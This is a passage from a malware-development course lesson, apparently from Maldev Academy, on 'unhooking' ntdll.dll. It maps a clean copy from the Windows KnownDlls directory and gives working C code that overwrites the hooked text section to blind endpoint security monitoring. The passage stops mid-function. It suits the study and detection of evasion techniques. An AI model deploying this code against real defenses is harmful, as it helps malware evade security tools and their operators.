<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>85. NTDLL Unhooking - From KnownDlls Directory</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="db89a0c0-abe5-4a79-9e98-16e7a2237546" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/85"><strong>85. NTDLL Unhooking - From KnownDlls Directory</strong></a></h1></header><div class="page-body"><h2 id="b7f3bcb8-bf64-44dd-a146-af23894a4a76" class=""><strong>NTDLL Unhooking - From KnownDlls Directory</strong></h2><h3 id="ad88a0c5-0ada-446d-9744-d6fb05c4b78a" class=""><strong>Introduction</strong></h3><p id="1758dabf-03e3-4627-95a9-df9efbf4170b" class="">Another way to obtain a clean version of <code>ntdll.dll</code> is by accessing it from the KnownDlls directory. This directory contains a set of frequently used system DLLs that the Windows loader leverages to optimize the application startup process. The loader maps the DLLs from KnownDlls directly into the starting processes, which are already present in memory. This approach saves memory and reduces computational resources by eliminating the need for mapping each required DLL from the disk.</p><p id="81073992-dfa7-410a-ac9c-221cb89a9f06" class="">In Windows XP and older, the KnownDlls directory was located in the <code>C:\Windows\System32</code> folder. Newer versions of Windows have the directory built into the OS and therefore the directory is not directly accessible. A list of known DLLs can be found in the <em>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</em> registry key as per <a href="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">Microsoft&#x27;s documentation</a>.</p><h3 id="10691871-5ecb-41c1-a334-322e4aade633" class=""><strong>Viewing KnownDlls Using WinObj</strong></h3><p id="e7a9bd8b-052f-485b-ab64-d1db1d888914" class="">The <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/winobj">WinObj</a> tool can be used to view the contents of the KnownDlls directory. This is demonstrated in the image below.</p><figure id="0d96dfa3-ef28-4840-a53c-e935123b4c6c" class="image"><a href="85%20NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory%20db89a0c0abe54a799e9816e7a2237546/ntdll-unhooking-knowndlls-118473010-cd9df141-2f08-47f7-a57e-fdd53ee6ab30.png"><img style="width:1322px" src="85%20NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory%20db89a0c0abe54a799e9816e7a2237546/ntdll-unhooking-knowndlls-118473010-cd9df141-2f08-47f7-a57e-fdd53ee6ab30.png"/></a></figure><h3 id="07fb7517-362f-42ba-a912-c9849c29814e" class=""><strong>Retrieving Ntdll.dll From KnownDlls</strong></h3><p id="947240c4-f8e6-48d7-affe-283bd036411b" class="">DLLs stored in the KnownDlls directory can be retrieved and mapped to the local process memory using a handle. This is achieved programmatically through the use of two WinAPI functions: <code>OpenFileMapping</code> to obtain the section handle of <code>ntdll.dll</code>, and <code>MapViewOfFile</code> to map <code>ntdll.dll</code> to memory.</p><p id="d1633145-5036-48a3-a70d-ab48fc15d845" class="">Using the <code>OpenFileMapping</code> WinAPI will always fail with the error <code>ERROR_BAD_PATHNAME</code>. As of writing this module, the reason is still unknown. However, an alternative method is to simply use its native function, <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtOpenSection.html">NtOpenSection</a>.</p><p id="aa65050a-b372-447a-840a-edff7e0951b8" class="">This is a good example of using syscalls instead of WinAPIs to perform tasks that are unavailable with WinAPIs.</p><h3 id="a4e49e68-c8b3-43db-99b9-ed8c42cd186f" class=""><strong>Using NtOpenSection</strong></h3><p id="35090d13-8c28-4c90-8aff-fc297076fd0a" class="">The <code>NtOpenSection</code> function is shown below.</p><pre id="4fdd12b1-f184-4593-88d7-59bae8e6ff5c" class="code code-wrap"><code>NTSTATUS NtOpenSection(
  OUT PHANDLE             SectionHandle,
  IN  ACCESS_MASK         DesiredAccess,
  IN  POBJECT_ATTRIBUTES  ObjectAttributes
);
</code></pre><p id="2d5ceb4f-ee6c-4fe3-999f-a2a4847fd716" class=""><code>NtOpenSection</code>&#x27;s parameters are explained below.</p><ul id="c407c463-f2cf-494f-8a42-85a86cbd7890" class="bulleted-list"><li style="list-style-type:disc"><code>SectionHandle</code> - A pointer to a <code>HANDLE</code> variable that receives a handle to the section object.</li></ul><ul id="84bd7622-8fa9-4b48-891e-382e4818af4d" class="bulleted-list"><li style="list-style-type:disc"><code>DesiredAccess</code> - A value that determines the requested access to the object. This value is of type <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/access-mask">ACCESS_MASK</a>. For NTDLL unhooking, this parameter should be set to <code>SECTION_MAP_READ</code> since <code>\KnownDlls\ntdll.dll</code> image will only be read.</li></ul><ul id="965ed72f-8327-494e-af4a-1a7684981491" class="bulleted-list"><li style="list-style-type:disc"><code>ObjectAttributes</code> - A pointer to an <a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes">OBJECT_ATTRIBUTES</a> structure that specifies the object name and other attributes. This parameter is initialized using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes">InitializeObjectAttributes</a> macro.</li></ul><h3 id="996933f2-961a-425b-880e-266fa85250af" class=""><strong>InitializeObjectAttributes</strong></h3><p id="c36f147a-f48a-469b-80ce-a44cc9bbc016" class="">As mentioned above, <code>ObjectAttributes</code> must be initialized using <code>InitializeObjectAttributes</code> in order to use <code>NtOpenSection</code>.</p><pre id="4bd60bf7-6e7a-4c43-ae51-2ebd49b078ff" class="code code-wrap"><code>VOID InitializeObjectAttributes(
  [out]          POBJECT_ATTRIBUTES   p,
  [in]           PUNICODE_STRING      n,
  [in]           ULONG                a,
  [in]           HANDLE               r,  // Set to NULL
  [in, optional] PSECURITY_DESCRIPTOR s   // Set to NULL
);
</code></pre><p id="dd3469f7-c740-44b4-ad30-7be6ca8a2c35" class=""><code>InitializeObjectAttributes</code>&#x27;s parameters are also shown below.</p><ul id="7befeaa6-a3f8-4f1c-805a-e92fb5b472fb" class="bulleted-list"><li style="list-style-type:disc"><code>p</code> - A pointer to an empty <code>OBJECT_ATTRIBUTES</code> structure that will be initialized.</li></ul><ul id="f3e3ff80-8779-4f35-b222-3f169526a9ea" class="bulleted-list"><li style="list-style-type:disc"><code>n</code> - A pointer to a <code>UNICODE_STRING</code> structure that contains the name of the object for which a handle is to be opened.</li></ul><ul id="d12ff984-e3a7-4170-a7fa-329f748ad981" class="bulleted-list"><li style="list-style-type:disc"><code>a</code> - Should be set to <code>OBJ_CASE_INSENSITIVE</code> to perform a case-insensitive comparison for the name of the object for which a handle is to be opened.</li></ul><p id="08fe8da7-73c3-48c4-9fe7-c970978b0486" class="">To properly use the <code>n</code> parameter, which is a <code>UNICODE_STRING</code> structure, the <code>buffer</code> member must be initialized as &quot;\KnownDlls\ntdll.dll&quot; (wide string format). The <code>length</code> member should be the size of the buffer in bytes. This initialization can be achieved using the code snippet below:</p><pre id="155ecb08-1407-4a89-81ad-9e03ffe961cf" class="code code-wrap"><code>UNICODE_STRING.Buffer = (PWSTR)L&quot;\KnownDlls\ntdll.dll&quot;;
UNICODE_STRING.Length = wcslen(L&quot;\KnownDlls\ntdll.dll&quot;) * sizeof(WCHAR);    // calculating the size of the string used in bytes
UNICODE_STRING.MaximumLength = UniStr.Length + sizeof(WCHAR);               // &#x27;.MaximumLength&#x27; can be the same as &#x27;.Length&#x27;
</code></pre><h3 id="dd931471-18cf-4275-bb1f-a8fc88822b66" class=""><strong>MapNtdllFromKnownDlls Function</strong></h3><p id="9a312a77-40c0-4605-8e0c-6455af6483cd" class="">The <code>MapNtdllFromKnownDlls</code> function is used to retrieve <code>ntdll.dll</code> from the KnownDlls directory. It accepts a single parameter, <code>ppNtdllBuf</code>, which will be set to the base address of the mapped view of the <code>ntdll.dll</code> file.</p><p id="bb453af5-ff27-4d73-a2e2-8e631a499218" class=""><code>MapNtdllFromKnownDlls</code> handles the parameters required for <code>NtOpenSection</code> before passing its output to <code>MapViewOfFile</code>, which is used to map <code>ntdll.dll</code> to local memory. The function returns a value of <code>FALSE</code> if it fails and <code>TRUE</code> if it succeeds.</p><pre id="5ad53821-b231-4b5c-908b-b65df7e39dbe" class="code code-wrap"><code>#define NTDLL	L&quot;\\KnownDlls\\ntdll.dll&quot;typedef NTSTATUS (NTAPI* fnNtOpenSection)(
	PHANDLE               SectionHandle,
	ACCESS_MASK           DesiredAccess,
	POBJECT_ATTRIBUTES    ObjectAttributes
);


BOOL MapNtdllFromKnownDlls(OUT PVOID* ppNtdllBuf) {

	HANDLE    		    hSection        = NULL;
	PBYTE     		    pNtdllBuffer    = NULL;
	NTSTATUS            	STATUS          = NULL;
	UNICODE_STRING      	UniStr          = { 0 };
	OBJECT_ATTRIBUTES  	ObjAtr          = { 0 };

	// constructing the &#x27;UNICODE_STRING&#x27; that will contain the &#x27;\KnownDlls\ntdll.dll&#x27; string
	UniStr.Buffer = (PWSTR)NTDLL;
	UniStr.Length = wcslen(NTDLL) * sizeof(WCHAR);
	UniStr.MaximumLength = UniStr.Length + sizeof(WCHAR);

	// initializing &#x27;ObjAtr&#x27; with &#x27;UniStr&#x27;
	InitializeObjectAttributes(&amp;ObjAtr, &amp;UniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	// getting NtOpenSection address
	fnNtOpenSection pNtOpenSection = (fnNtOpenSection)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;NtOpenSection&quot;);

	// getting the handle of ntdll.dll from KnownDlls
	STATUS = pNtOpenSection(&amp;hSection, SECTION_MAP_READ, &amp;ObjAtr);
	if (STATUS != 0x00) {
		printf(&quot;[!] NtOpenSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		goto _EndOfFunc;
	}

	// mapping the view of file of ntdll.dll
	pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
	if (pNtdllBuffer == NULL) {
		printf(&quot;[!] MapViewOfFile Failed With Error : %d \n&quot;, GetLastError());
		goto _EndOfFunc;
	}

	*ppNtdllBuf = pNtdllBuffer;

_EndOfFunc:
	if (hSection)
		CloseHandle(hSection);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre><h3 id="e4c08272-bcb8-4f94-9cc4-d51dc50549b2" class=""><strong>Putting It All Together</strong></h3><p id="dcb0e248-42e2-4db8-8634-5c6d6d7af12b" class="">Now that an unhooked version of <code>ntdll.dll</code> has been loaded into the process&#x27;s memory, the <code>ReplaceNtdllTxtSection</code> function shown in the previous module will be used to replace the text section of the hooked <code>ntdll.dll</code> with the newly unhooked one. The only difference is that the <code>pUnhookedNtdll</code> parameter now contains the base address of the NTDLL module fetched from the KnownDlls directory, rather than from disk.</p><p id="8e0f32d2-c67f-4abf-aff4-5dc5e434ca1c" class="">Note that the text section of the KnownDlls <code>ntdll.dll</code> has an offset of <code>IMAGE_SECTION_HEADER.VirtualAddress</code> (4096), which explains the usage of <code>pSectionHeader[i].VirtualAddress</code> to retrieve the address of the text section (<code>pRemoteNtdllTxt</code>) in the code below.</p><pre id="51038b70-5bf3-4a00-a872-d47dc55ed098" class="code code-wrap"><code>PVOID FetchLocalNtdllBaseAddress() {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64// Reaching to the &#x27;ntdll.dll&#x27; module directly (we know its the 2nd image after &#x27;KnownDllUnhooking.exe&#x27;)
	// 0x10 is = sizeof(LIST_ENTRY)
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

	return pLdr-&gt;DllBase;
}


BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

	PVOID               pLocalNtdll     = (PVOID)FetchLocalNtdllBaseAddress();

	// getting the dos header
	PIMAGE_DOS_HEADER   pLocalDosHdr    = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr &amp;&amp; pLocalDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// getting the nt headers
	PIMAGE_NT_HEADERS   pLocalNtHdrs     = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr-&gt;e_lfanew);
	if (pLocalNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt	= NULL,	// local hooked text section base address
			    pRemoteNtdllTxt  = NULL; // the unhooked text section base address
	SIZE_T		sNtdllTxtSize	= NULL;	// the size of the text section


	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i &lt; pLocalNtHdrs-&gt;FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, &quot;.text&quot;) == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == &#x27;xet.&#x27;) {
			pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt	= (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
			sNtdllTxtSize	= pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

//---------------------------------------------------------------------------------------------------------------------------

	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	// small check to verify that &#x27;pRemoteNtdllTxt&#x27; is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
		return FALSE;

//---------------------------------------------------------------------------------------------------------------------------

	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &amp;dwOldProtection)) {
		printf(&quot;[!] VirtualProtect [1] Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	// copying the new text section
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	// rrestoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &amp;dwOldProtection)) {
		printf(&quot;[!] VirtualProtect [2] Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

